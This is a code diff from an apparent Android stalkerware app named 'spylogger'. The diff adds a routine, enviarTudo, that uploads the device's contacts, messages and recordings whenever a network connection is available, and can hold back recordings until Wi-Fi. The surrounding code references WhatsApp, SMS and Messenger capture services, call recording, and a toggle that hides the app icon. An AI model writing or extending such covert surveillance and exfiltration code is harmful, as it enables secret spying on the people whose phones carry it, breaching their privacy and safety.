@@ -9,9 +9,6 @@ import android.content.Intent;
 import android.content.pm.ApplicationInfo;
 import android.content.pm.PackageManager;
 import android.database.Cursor;
-import android.net.ConnectivityManager;
-import android.net.NetworkInfo;
-import android.net.NetworkInfo.State;
 import android.net.Uri;
 import android.os.Environment;
 import android.os.FileObserver;
@@ -25,12 +22,18 @@ import android.webkit.MimeTypeMap;
 
 import com.google.firebase.iid.FirebaseInstanceId;
 import com.gravatasufoca.spylogger.dao.messenger.DatabaseHelperFacebookContacts;
+import com.gravatasufoca.spylogger.helpers.NetworkUtil;
 import com.gravatasufoca.spylogger.model.Configuracao;
 import com.gravatasufoca.spylogger.model.TipoMidia;
 import com.gravatasufoca.spylogger.model.messenger.Contact;
 import com.gravatasufoca.spylogger.receivers.Alarm;
+import com.gravatasufoca.spylogger.repositorio.RepositorioConfiguracao;
+import com.gravatasufoca.spylogger.repositorio.impl.RepositorioConfiguracaoImpl;
 import com.gravatasufoca.spylogger.services.MessengerService;
 import com.gravatasufoca.spylogger.services.RecordService;
+import com.gravatasufoca.spylogger.services.SendContatosService;
+import com.gravatasufoca.spylogger.services.SendGravacoesService;
+import com.gravatasufoca.spylogger.services.SendMensagensService;
 import com.gravatasufoca.spylogger.services.SmsService;
 import com.gravatasufoca.spylogger.services.WhatsAppService;
 import com.gravatasufoca.spylogger.vos.ContatoVO;
@@ -313,31 +316,6 @@ public class Utils {
             type = MimeTypeMap.getSingleton().getMimeTypeFromExtension(extension);
         }
         return type;
-    }
-
-    public static boolean isConnected(Context context,boolean dataOnWifiOnly) {
-        ConnectivityManager connectivityManager = (ConnectivityManager) context
-                .getSystemService(Context.CONNECTIVITY_SERVICE);
-        NetworkInfo mobileInfo = connectivityManager
-                .getNetworkInfo(ConnectivityManager.TYPE_MOBILE);
-        State mobile = NetworkInfo.State.DISCONNECTED;
-        if (mobileInfo != null) {
-            mobile = mobileInfo.getState();
-        }
-        NetworkInfo wifiInfo = connectivityManager
-                .getNetworkInfo(ConnectivityManager.TYPE_WIFI);
-        State wifi = NetworkInfo.State.DISCONNECTED;
-        if (wifiInfo != null) {
-            wifi = wifiInfo.getState();
-        }
-
-        if ((!dataOnWifiOnly && (mobile.equals(NetworkInfo.State.CONNECTED) || wifi
-                .equals(NetworkInfo.State.CONNECTED)))
-                || (dataOnWifiOnly && wifi.equals(NetworkInfo.State.CONNECTED))) {
-            return true;
-        } else {
-            return false;
-        }
     }
 
     public static void showIcon(boolean show, Context ctx) {
@@ -624,5 +602,37 @@ public class Utils {
             context.startService(new Intent(context, RecordService.class));
         }
         startAlarm(context,configuracao);
+    }
+
+    public static void enviarTudo(Context context){
+        try {
+            RepositorioConfiguracao repositorioConfiguracao=new RepositorioConfiguracaoImpl(context);
+
+            Configuracao configuracao= repositorioConfiguracao.getConfiguracao();
+
+            if(configuracao!=null){
+                int status= NetworkUtil.getConnectivityStatusString(context);
+                if(status!=NetworkUtil.NETWORK_STATUS_NOT_CONNECTED) {
+                    SendContatosService sendContatosService = new SendContatosService(context, null);
+                    sendContatosService.enviarContatos();
+
+                    SendMensagensService sendMensagensService = new SendMensagensService(context, null);
+                    sendMensagensService.enviarTopicos();
+
+                    if(configuracao.isWifi()) {
+                        if (status == NetworkUtil.NETWORK_STATUS_WIFI) {
+                            SendGravacoesService sendGravacoesService = new SendGravacoesService(context, null);
+                            sendGravacoesService.enviarTopicos();
+                        }
+                    }else{
+                        SendGravacoesService sendGravacoesService = new SendGravacoesService(context, null);
+                        sendGravacoesService.enviarTopicos();
+                    }
+                }
+            }
+
+        } catch (SQLException e) {
+            e.printStackTrace();
+        }
     }
 }
